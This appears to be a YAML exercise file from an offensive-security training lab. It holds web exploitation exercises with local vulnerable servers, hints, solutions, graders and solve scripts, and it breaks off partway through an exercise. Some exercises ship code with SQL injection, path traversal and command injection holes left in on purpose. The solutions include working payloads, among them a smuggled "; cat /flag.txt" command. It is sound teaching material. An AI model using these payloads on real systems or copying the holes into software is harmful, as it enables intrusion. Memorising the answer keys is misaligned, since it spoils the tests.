track: offsec
module: Web exploitation — fundamentals
profile: offsec
order: 1
exercises:

- id: offsec-web-001
  title: The secret in the page
  difficulty: 1
  kind: build
  tags: [web, recon, http]
  scenario: |
    A web server is running on **http://127.0.0.1:8080/**. Somewhere in what it
    sends back is a flag of the form **`KL{...}`** — developers leave these in
    comments, headers and forgotten files more often than you'd think.

    Find the flag and write it (just the `KL{...}` token) to **`/lab/flag.txt`**.
  hints:
    - "Fetch the page with `curl -s http://127.0.0.1:8080/` and read *everything* — including HTML comments."
    - "`curl -s http://127.0.0.1:8080/ | grep -oE 'KL\\{[0-9a-f]+\\}'`"
  solution: |
    The flag sits in an HTML comment in the homepage source — invisible in a
    browser, obvious in the raw response.

    ```bash
    curl -s http://127.0.0.1:8080/ | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt
    cat /lab/flag.txt
    ```
  setup: |
    FLAG=$(rand_flag); export FLAG
    echo "$FLAG" > "$KL_STATE/answer"
    web_target recon 8080 <<'PY'
    import os, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8080"))
    FLAG = os.environ.get("FLAG", "KL{missing}")
    PAGE = ("<!doctype html><html><head><title>Acme Intranet</title></head>"
            "<body><h1>Acme Intranet</h1><p>Welcome. Nothing to see here.</p>"
            "<!-- TODO: remove debug flag before launch: %s -->"
            "</body></html>") % FLAG
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def do_GET(self):
            body = PAGE.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("0.0.0.0", PORT), H) as s:
        s.serve_forever()
    PY
  check: |
    want=$(cat "$KL_STATE/answer")
    got=$(grep -oE 'KL\{[0-9a-f]+\}' /lab/flag.txt 2>/dev/null | head -1)
    check_eq "flag captured in /lab/flag.txt" "$got" "$want"
  solve: |
    curl -s http://127.0.0.1:8080/ | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt

- id: offsec-web-002
  title: Knock on every door
  difficulty: 2
  kind: build
  tags: [web, recon, fuzzing]
  scenario: |
    The site on **http://127.0.0.1:8080/** has an unlinked page — a page nobody
    put a link to, but that is still reachable if you guess its name. This is
    *content discovery*: trying a wordlist of common names against the server.

    A small wordlist lives at **`/usr/share/kl/wordlists/common.txt`**. Use it to
    find the hidden path. Write the path you found (e.g. `/backup`) to
    **`/lab/path.txt`**, and the **`KL{...}`** flag that page returns to
    **`/lab/flag.txt`**.
  hints:
    - "For each word, request `http://127.0.0.1:8080/<word>` and watch the HTTP status code — 200 means it exists, 404 means it doesn't."
    - "`while read w; do code=$(curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:8080/$w); [ \"$code\" = 200 ] && echo /$w; done < /usr/share/kl/wordlists/common.txt`"
  solution: |
    ```bash
    while read w; do
      code=$(curl -s -o /dev/null -w '%{http_code}' "http://127.0.0.1:8080/$w")
      [ "$code" = 200 ] && echo "/$w"
    done < /usr/share/kl/wordlists/common.txt
    # -> /backup
    echo /backup > /lab/path.txt
    curl -s http://127.0.0.1:8080/backup | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt
    ```
  setup: |
    FLAG=$(rand_flag); export FLAG
    echo "$FLAG" > "$KL_STATE/answer"
    web_target recon 8080 <<'PY'
    import os, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8080"))
    FLAG = os.environ.get("FLAG", "KL{missing}")
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def _send(self, code, body, ctype="text/html"):
            b = body.encode()
            self.send_response(code)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(b)))
            self.end_headers()
            self.wfile.write(b)
        def do_GET(self):
            path = self.path.split("?", 1)[0].rstrip("/")
            if path == "" :
                self._send(200, "<h1>Acme</h1><p>Home</p>")
            elif path == "/backup":
                self._send(200, "<pre>db backup\nadmin:%s\n</pre>" % FLAG)
            else:
                self._send(404, "<h1>404 Not Found</h1>")
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("0.0.0.0", PORT), H) as s:
        s.serve_forever()
    PY
  check: |
    want=$(cat "$KL_STATE/answer")
    got=$(grep -oE 'KL\{[0-9a-f]+\}' /lab/flag.txt 2>/dev/null | head -1)
    path=$(tr -d ' \t\r\n' < /lab/path.txt 2>/dev/null)
    check_eq "hidden path found" "$path" "/backup"
    check_eq "flag captured in /lab/flag.txt" "$got" "$want"
  solve: |
    for w in $(cat /usr/share/kl/wordlists/common.txt); do
      code=$(curl -s -o /dev/null -w '%{http_code}' "http://127.0.0.1:8080/$w")
      [ "$code" = 200 ] && echo "/$w" > /lab/path.txt
    done
    curl -s http://127.0.0.1:8080/backup | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt

- id: offsec-web-003
  title: Log in as admin without the password
  difficulty: 2
  kind: build
  tags: [web, sqli, auth-bypass]
  scenario: |
    **http://127.0.0.1:8080/** has a login form that posts `username` and
    `password`. Behind it, the app builds a SQL query by pasting your input
    straight into a string — the classic SQL-injection bug.

    Log in as **`admin`** without knowing the password. On success the app
    returns a **`KL{...}`** flag. Write it to **`/lab/flag.txt`**.
  hints:
    - "The query looks like `SELECT ... WHERE username='<you>' AND password='<you>'`. Comment out the password check with `--`."
    - "POST `username=admin' -- ` and any password: `curl -s -X POST http://127.0.0.1:8080/login --data-urlencode \"username=admin' -- \" --data 'password=x'`"
  solution: |
    Supplying `admin' -- ` as the username turns the query into
    `... WHERE username='admin' -- ' AND password='x'`; the `--` comments out the
    password check.

    ```bash
    curl -s -X POST http://127.0.0.1:8080/login \
      --data-urlencode "username=admin' -- " --data 'password=x' \
      | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt
    ```
  setup: |
    FLAG=$(rand_flag); export FLAG
    echo "$FLAG" > "$KL_STATE/answer"
    web_target login 8080 <<'PY'
    import os, sqlite3, urllib.parse, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8080"))
    FLAG = os.environ.get("FLAG", "KL{missing}")
    db = sqlite3.connect(":memory:", check_same_thread=False)
    db.execute("CREATE TABLE users(username TEXT, password TEXT)")
    db.execute("INSERT INTO users VALUES('admin', 's3cr3t-"+os.urandom(6).hex()+"')")
    db.commit()
    FORM = "<form method=post action=/login><input name=username><input name=password type=password><button>Log in</button></form>"
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def _send(self, code, body):
            b = body.encode()
            self.send_response(code)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(b)))
            self.end_headers()
            self.wfile.write(b)
        def do_GET(self):
            self._send(200, "<h1>Login</h1>" + FORM)
        def do_POST(self):
            n = int(self.headers.get("Content-Length", "0"))
            data = urllib.parse.parse_qs(self.rfile.read(n).decode())
            u = data.get("username", [""])[0]
            p = data.get("password", [""])[0]
            # VULNERABLE: string-built query
            q = "SELECT username FROM users WHERE username='%s' AND password='%s'" % (u, p)
            try:
                row = db.execute(q).fetchone()
            except Exception as e:
                self._send(200, "<p>error: %s</p>" % e); return
            if row:
                self._send(200, "<p>Welcome %s. Flag: %s</p>" % (row[0], FLAG))
            else:
                self._send(200, "<p>Bad credentials</p>" + FORM)
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("0.0.0.0", PORT), H) as s:
        s.serve_forever()
    PY
  check: |
    want=$(cat "$KL_STATE/answer")
    got=$(grep -oE 'KL\{[0-9a-f]+\}' /lab/flag.txt 2>/dev/null | head -1)
    check_eq "flag captured via auth bypass" "$got" "$want"
  solve: |
    curl -s -X POST http://127.0.0.1:8080/login \
      --data-urlencode "username=admin' -- " --data 'password=x' \
      | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt

- id: offsec-web-004
  title: Climb out of the web root
  difficulty: 3
  kind: build
  tags: [web, path-traversal, lfi]
  scenario: |
    **http://127.0.0.1:8080/view?file=welcome.txt** serves files from the app's
    `pages/` directory. It pastes the `file` parameter onto a path with no
    checking, so `../` sequences walk back up the filesystem — *path traversal*.

    A secret file **`secret.txt`** sits in the container's root directory (`/`),
    outside `pages/`. Read it through the vulnerable endpoint and write the
    **`KL{...}`** flag it contains to **`/lab/flag.txt`**.
  hints:
    - "`pages/` is a couple of directories deep. Prefix the filename with enough `../` to reach `/`, then name the file: `../../secret.txt`."
    - "`curl -s 'http://127.0.0.1:8080/view?file=../../secret.txt'`"
  solution: |
    ```bash
    curl -s 'http://127.0.0.1:8080/view?file=../../secret.txt' \
      | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt
    ```
  setup: |
    SECRET=$(rand_flag); export SECRET
    echo "$SECRET" > "$KL_STATE/answer"
    web_target traversal 8080 <<'PY'
    import os, urllib.parse, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8080"))
    SECRET = os.environ.get("SECRET", "KL{missing}")
    os.makedirs("/app/pages", exist_ok=True)
    open("/app/pages/welcome.txt", "w").write("Welcome to Acme docs.\n")
    open("/secret.txt", "w").write(SECRET + "\n")   # outside the web root
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def _send(self, code, body, ctype="text/plain"):
            b = body if isinstance(body, bytes) else body.encode()
            self.send_response(code)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(b)))
            self.end_headers()
            self.wfile.write(b)
        def do_GET(self):
            u = urllib.parse.urlparse(self.path)
            if u.path != "/view":
                self._send(200, "Try /view?file=welcome.txt"); return
            q = urllib.parse.parse_qs(u.query)
            name = q.get("file", ["welcome.txt"])[0]
            # VULNERABLE: no sanitisation of `name`
            path = "/app/pages/" + name
            try:
                with open(path, "rb") as f:
                    self._send(200, f.read())
            except Exception as e:
                self._send(404, "error: %s" % e)
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("0.0.0.0", PORT), H) as s:
        s.serve_forever()
    PY
  check: |
    want=$(cat "$KL_STATE/answer")
    got=$(grep -oE 'KL\{[0-9a-f]+\}' /lab/flag.txt 2>/dev/null | head -1)
    check_eq "secret read via traversal" "$got" "$want"
  solve: |
    curl -s 'http://127.0.0.1:8080/view?file=../../secret.txt' \
      | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt

- id: offsec-web-005
  title: The diagnostics endpoint runs your commands
  difficulty: 3
  kind: build
  tags: [web, command-injection, rce]
  scenario: |
    An admin diagnostics endpoint, **http://127.0.0.1:8080/ping?host=127.0.0.1**,
    shells out to the system `ping`, building the command by concatenating your
    `host` value. That means shell metacharacters in `host` run as commands —
    *command injection*.

    There is a readable file **`/flag.txt`** inside the container. Use the
    injection to read it and write the **`KL{...}`** flag to **`/lab/flag.txt`**.
  hints:
    - "`;` ends one command and starts another. Make `host` be `127.0.0.1; cat /flag.txt`."
    - "URL-encode it: `curl -s 'http://127.0.0.1:8080/ping' --data-urlencode 'host=127.0.0.1; cat /flag.txt' -G`"
  solution: |
    ```bash
    curl -s -G 'http://127.0.0.1:8080/ping' \
      --data-urlencode 'host=127.0.0.1; cat /flag.txt' \
      | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt
    ```
  setup: |
    FLAG=$(rand_flag); export FLAG
    echo "$FLAG" > "$KL_STATE/answer"
    web_target cmdi 8080 <<'PY'
    import os, subprocess, urllib.parse, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8080"))
    FLAG = os.environ.get("FLAG", "KL{missing}")
    open("/flag.txt", "w").write(FLAG + "\n")
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def _send(self, code, body):
            b = body.encode()
            self.send_response(code)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(b)))
            self.end_headers()
            self.wfile.write(b)
        def do_GET(self):
            u = urllib.parse.urlparse(self.path)
            if u.path != "/ping":
                self._send(200, "Usage: /ping?host=127.0.0.1"); return
            host = urllib.parse.parse_qs(u.query).get("host", ["127.0.0.1"])[0]
            # VULNERABLE: shell command built from user input
            cmd = "ping -c1 -W1 " + host
            out = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            self._send(200, out.stdout + out.stderr)
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("0.0.0.0", PORT), H) as s:
        s.serve_forever()
    PY
  check: |
    want=$(cat "$KL_STATE/answer")
    got=$(grep -oE 'KL\{[0-9a-f]+\}' /lab/flag.txt 2>/dev/null | head -1)
    check_eq "flag read via command injection" "$got" "$want"
  solve: |
    curl -s -G 'http://127.0.0.1:8080/ping' \
      --data-urlencode 'host=127.0.0.1; cat /flag.txt' \
      | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt

- id: offsec-web-006
  title: Patch the injectable login
  difficulty: 3
  kind: fix
  tags: [web, sqli, remediation]
  scenario: |
    The login service source is in **`/lab/app.py`**. It is vulnerable to SQL
    injection: `admin' -- ` logs in without the password. Your job is to **fix
    it** — parameterise the query so injection no longer works, while a genuine
    login with the real credentials **`admin` / `s3cr3t`** still succeeds.

    Leave the fixed source in `/lab/app.py`. The grader starts your version in a
    fresh container and tries both a real login and the injection.
  hints:
    - "Never build SQL by string concatenation. Use a parameterised query: `cur.execute(\"... WHERE username=? AND password=?\", (u, p))`."
    - "Replace the `q = \"... '%s' ...\" % (u, p)` line and the `execute(q)` call with a single parameterised `execute(sql, (u, p))`."
  solution: |
    Swap the string-built query for a parameterised one so the database treats
    `u`/`p` as data, never as SQL:

    ```python
    row = db.execute(
        "SELECT username FROM users WHERE username=? AND password=?",
        (u, p),
    ).fetchone()
    ```

    Re-check: `admin` / `s3cr3t` still logs in; `admin' -- ` no longer does.
  setup: |
    echo ok > "$KL_STATE/answer"
    # Ship the vulnerable source for the learner to fix.
    lab_file /lab/app.py <<'PY'
    import os, sqlite3, urllib.parse, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8080"))
    db = sqlite3.connect(":memory:", check_same_thread=False)
    db.execute("CREATE TABLE users(username TEXT, password TEXT)")
    db.execute("INSERT INTO users VALUES('admin', 's3cr3t')")
    db.commit()
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def _send(self, code, body):
            b = body.encode()
            self.send_response(code); self.send_header("Content-Type","text/html")
            self.send_header("Content-Length", str(len(b))); self.end_headers()
            self.wfile.write(b)
        def do_POST(self):
            n = int(self.headers.get("Content-Length","0"))
            d = urllib.parse.parse_qs(self.rfile.read(n).decode())
            u = d.get("username",[""])[0]; p = d.get("password",[""])[0]
            # VULNERABLE: fix this query
            q = "SELECT username FROM users WHERE username='%s' AND password='%s'" % (u, p)
            try:
                row = db.execute(q).fetchone()
            except Exception as e:
                self._send(200, "error"); return
            self._send(200, "OK" if row else "DENIED")
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("0.0.0.0", PORT), H) as s:
        s.serve_forever()
    PY
  check: |
    # Start the learner's version in a throwaway container and probe it.
    docker rm -f kl-fixcheck >/dev/null 2>&1 || true
    docker run -d --name kl-fixcheck -p 127.0.0.1:8099:8080 -e PORT=8080 \
      -v /lab/app.py:/app/app.py:ro python:3.12-alpine python /app/app.py >/dev/null 2>&1
    on_reset 'docker rm -f kl-fixcheck >/dev/null 2>&1'
    if ! eventually 15 'curl -s -o /dev/null -X POST http://127.0.0.1:8099/ --data x=1'; then
      fail "app.py starts and serves"; docker rm -f kl-fixcheck >/dev/null 2>&1; kl_finish
    fi
    real=$(curl -s -X POST http://127.0.0.1:8099/login --data 'username=admin' --data 'password=s3cr3t')
    inj=$(curl -s -X POST http://127.0.0.1:8099/login --data-urlencode "username=admin' -- " --data 'password=x')
    docker rm -f kl-fixcheck >/dev/null 2>&1
    check "genuine login (admin/s3cr3t) still works" '[ "'"$real"'" = OK ]'
    check_not "injection (admin'\'' -- ) is rejected" '[ "'"$inj"'" = OK ]'
  solve: |
    # Reference fix: parameterised query instead of string concatenation.
    cat > /lab/app.py <<'PY'
    import os, sqlite3, urllib.parse, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8080"))
    db = sqlite3.connect(":memory:", check_same_thread=False)
    db.execute("CREATE TABLE users(username TEXT, password TEXT)")
    db.execute("INSERT INTO users VALUES('admin', 's3cr3t')")
    db.commit()
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def _send(self, code, body):
            b = body.encode()
            self.send_response(code); self.send_header("Content-Type","text/html")
            self.send_header("Content-Length", str(len(b))); self.end_headers()
            self.wfile.write(b)
        def do_POST(self):
            n = int(self.headers.get("Content-Length","0"))
            d = urllib.parse.parse_qs(self.rfile.read(n).decode())
            u = d.get("username",[""])[0]; p = d.get("password",[""])[0]
            # FIXED: parameterised query
            row = db.execute("SELECT username FROM users WHERE username=? AND password=?", (u, p)).fetchone()
            self._send(200, "OK" if row else "DENIED")
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("0.0.0.0", PORT), H) as s:
        s.serve_forever()
    PY

- id: offsec-web-007
  title: It's in the headers
  difficulty: 2
  kind: build
  tags: [web, recon, http-headers]
  scenario: |
    Not everything a server tells you is in the page body. **http://127.0.0.1:8080/**
    returns a boring page, but one of its **response headers** carries a `KL{...}`
    flag — the kind of debug header that escapes into production.

    Capture the flag from the headers and write it to **`/lab/flag.txt`**.
  hints:
    - "`curl -s -D - -o /dev/null URL` makes a normal GET but prints the response headers."
    - "`curl -s -D - -o /dev/null http://127.0.0.1:8080/ | grep -oE 'KL\\{[0-9a-f]+\\}'`"
  solution: |
    ```bash
    curl -s -D - -o /dev/null http://127.0.0.1:8080/ | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt
    ```
  setup: |
    FLAG=$(rand_flag); export FLAG
    echo "$FLAG" > "$KL_STATE/answer"
    web_target hdr 8080 <<'PY'
    import os, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8080")); FLAG = os.environ.get("FLAG","KL{x}")
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self,*a): pass
        def do_GET(self):
            b=b"<h1>Acme</h1><p>Nothing to see.</p>"
            self.send_response(200)
            self.send_header("Content-Type","text/html")
            self.send_header("X-Debug-Token", FLAG)
            self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
    socketserver.TCPServer.allow_reuse_address=True
    with socketserver.TCPServer(("0.0.0.0",PORT),H) as s: s.serve_forever()
    PY
  check: |
    want=$(cat "$KL_STATE/answer")
    got=$(grep -oE 'KL\{[0-9a-f]+\}' /lab/flag.txt 2>/dev/null | head -1)
    check_eq "flag captured from response header" "$got" "$want"
  solve: |
    curl -s -D - -o /dev/null http://127.0.0.1:8080/ | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt

- id: offsec-web-008
  title: Ask the robots
  difficulty: 2
  kind: build
  tags: [web, recon, robots]
  scenario: |
    **http://127.0.0.1:8080/robots.txt** tells crawlers which paths to stay away
    from — which is exactly a map of the paths worth looking at. One `Disallow`
    entry points at an admin page that leaks a **`KL{...}`** flag.

    Read `robots.txt`, visit the disallowed path, and write the flag to
    **`/lab/flag.txt`**.
  hints:
    - "`curl -s http://127.0.0.1:8080/robots.txt` — note the `Disallow:` path, then request it."
    - "`p=$(curl -s http://127.0.0.1:8080/robots.txt | awk '/Disallow/{print $2}'); curl -s http://127.0.0.1:8080$p`"
  solution: |
    ```bash
    p=$(curl -s http://127.0.0.1:8080/robots.txt | awk '/Disallow/{print $2}')
    curl -s "http://127.0.0.1:8080$p" | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt
    ```
  setup: |
    FLAG=$(rand_flag); export FLAG
    echo "$FLAG" > "$KL_STATE/answer"
    web_target robots 8080 <<'PY'
    import os, http.server, socketserver
    PORT=int(os.environ.get("PORT","8080")); FLAG=os.environ.get("FLAG","KL{x}")
    HIDDEN="/admin-console"
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self,*a): pass
        def _s(self,c,body,ct="text/html"):
            b=body.encode(); self.send_response(c); self.send_header("Content-Type",ct)
            self.send_header("Content-Length",str(len(b))); self.end_headers(); self.wfile.write(b)
        def do_GET(self):
            p=self.path.split("?",1)[0]
            if p=="/robots.txt": self._s(200,"User-agent: *\nDisallow: %s\n"%HIDDEN,"text/plain")
            elif p==HIDDEN: self._s(200,"<h1>Admin</h1><p>flag: %s</p>"%FLAG)
            elif p=="/": self._s(200,"<h1>Acme</h1>")
            else: self._s(404,"nope")
